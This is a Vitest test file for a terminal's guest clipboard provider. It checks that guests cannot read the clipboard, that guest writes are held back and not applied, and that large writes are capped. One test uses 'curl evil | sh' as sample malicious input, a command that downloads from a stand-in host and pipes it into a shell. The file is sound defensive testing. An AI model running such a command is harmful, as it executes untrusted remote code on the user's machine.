import { describe, it, expect, vi } from 'vitest';
import { createGuestClipboardProvider, MAX_PENDING_COPY } from './terminalClipboard.js';

describe('createGuestClipboardProvider', () => {
  it('never lets the guest read the clipboard', async () => {
    const p = createGuestClipboardProvider(() => {});
    expect(await p.readText('c')).toBe('');
    expect(await p.readText('p')).toBe('');
  });

  it('parks guest writes instead of applying them', () => {
    const onWrite = vi.fn();
    const writeText = vi.fn();
    vi.stubGlobal('navigator', { clipboard: { writeText } });
    const p = createGuestClipboardProvider(onWrite);
    p.writeText('c', 'curl evil | sh\n');
    expect(onWrite).toHaveBeenCalledWith('curl evil | sh\n');
    expect(writeText).not.toHaveBeenCalled();
    vi.unstubAllGlobals();
  });

  it('ignores empty writes and caps huge ones', () => {
    const onWrite = vi.fn();
    const p = createGuestClipboardProvider(onWrite);
    p.writeText('c', '');
    expect(onWrite).not.toHaveBeenCalled();
    p.writeText('c', 'a'.repeat(MAX_PENDING_COPY + 10));
    expect(onWrite.mock.calls[0][0].length).toBe(MAX_PENDING_COPY);
  });
});
